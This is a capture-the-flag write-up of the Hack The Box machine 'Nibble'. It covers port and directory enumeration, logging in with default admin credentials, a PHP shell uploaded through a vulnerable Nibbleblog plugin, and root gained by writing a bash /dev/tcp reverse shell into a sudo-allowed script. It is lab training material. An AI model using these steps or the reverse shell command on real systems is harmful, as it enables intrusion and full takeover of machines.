---
title: CTF Writeup - HTB Nibble
date: 2023-11-14
author: kei5uke
description: Writeup for HTB Nibble
tags:
  - linux
  - writeup
---

# Nibble

# Enumeration

## Nmap

```bash
┌──(root💀kali)-[~/nibble]
└─# nmap -sV -sC -T4 -p- 10.129.68.48 -oN nmap.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-14 22:53 EET
Nmap scan report for 10.129.68.48
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.87 seconds
```

## Curl

Default page shows that there is a directory called `/nibbleblog`

```bash
┌──(root💀kali)-[/opt/generic]
└─# curl -X POST http://10.129.68.48
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

## Gobuster

```bash
┌──(root💀kali)-[~/nibble]
└─# gobuster dir -u http://10.129.68.48/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.68.48/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/11/14 23:02:51 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 325] [--> http://10.129.68.48/nibbleblog/content/]
/themes               (Status: 301) [Size: 324] [--> http://10.129.68.48/nibbleblog/themes/]
/admin                (Status: 301) [Size: 323] [--> http://10.129.68.48/nibbleblog/admin/]
/plugins              (Status: 301) [Size: 325] [--> http://10.129.68.48/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 327] [--> http://10.129.68.48/nibbleblog/languages/]
Progress: 87625 / 87665 (99.95%)
===============================================================
2023/11/14 23:09:56 Finished
===============================================================
```

## Enumerating the blog

README in the blog says that the blog is called nibble and the version is 4.0.3

The exploit below says that there is php file that can upload some file, after logging as admin

[https://github.com/dix0nym/CVE-2015-6967](https://github.com/dix0nym/CVE-2015-6967)

You can login to admin page at `admin.php`

Username is `admin` and password is `nibbles`

Here in the My image plugin allows you to upload shell.

![Screenshot 2023-11-14 at 23.22.23.png](Nibble%200c3653b2aacf4a008231c03c2d1bb919/Screenshot_2023-11-14_at_23.22.23.png)

# Exploit

Access to the uploaded image file by pasting the link in the browser.

```bash
10.129.68.48/nibbleblog/content/private/plugins/my_image/image.php
```

I got the first shell.

```bash
┌──(root💀kali)-[~/nibble]
└─# rlwrap nc -lvnp 443                           
listening on [any] 443 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.68.48] 42354
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 16:21:28 up 30 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
nibbler
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

# Privilege Escalation

[monitor.sh](http://monitor.sh) allows you to execute any bash script as root, I guess

```bash
nibbler@Nibbles:/tmp$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

I made reverse shell script and executed as root

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ touch monitor.sh
touch monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '#!/bin/bash' >> monitor.sh
<er/personal/stuff$ echo '#!/bin/bash' >> monitor.sh                         
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'bash -i >& /dev/tcp/10.10.16.23/1234 0>&1' >> monitor.sh
<ash -i >& /dev/tcp/10.10.16.23/1234 0>&1' >> monitor.sh                     
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod 777 monitor.sh
chmod 777 monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
<er/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
```

# Root shell

I got root shell.

![Screenshot 2023-11-14 at 23.59.43.png](Nibble%200c3653b2aacf4a008231c03c2d1bb919/Screenshot_2023-11-14_at_23.59.43.png)